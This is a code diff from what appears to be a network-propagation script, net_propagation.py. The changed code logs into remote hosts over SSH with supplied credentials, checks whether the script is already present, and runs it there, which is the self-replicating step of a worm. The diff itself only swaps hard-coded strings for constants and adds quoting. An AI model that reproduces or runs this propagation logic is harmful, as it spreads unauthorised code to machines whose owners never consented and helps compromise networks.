@@ -106,9 +106,9 @@ def check_over_ssh(ip, port, username, password):
         client.set_missing_host_key_policy(RejectPolicy)
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
-        client.exec_command(strings.touch_file(os.path.basename(__file__)))
-        if str(client.exec_command(pipes.quote(
-                "cat src/net_propagation.py"))[1]).__len__() < 1:
+        client.exec_command(strings.touch_file(strings.MAIN_SCRIPT))
+        if str(client.exec_command(pipes.quote(strings.cat_file(
+                strings.MAIN_SCRIPT)))[1]).__len__() < 1:
             client.close()
             return True
         client.close()
@@ -357,7 +357,7 @@ def propagate_script(ip, port, login_string):
                 client.connect(hostname=str(ip), port=int(port),
                                username=str(login_string_split[0]),
                                password=str(login_string_split[1]))
-                client.exec_command(strings.run_script_command())
+                client.exec_command(pipes.quote(strings.run_script_command()))
                 client.close()
                 return True
             except RuntimeError:
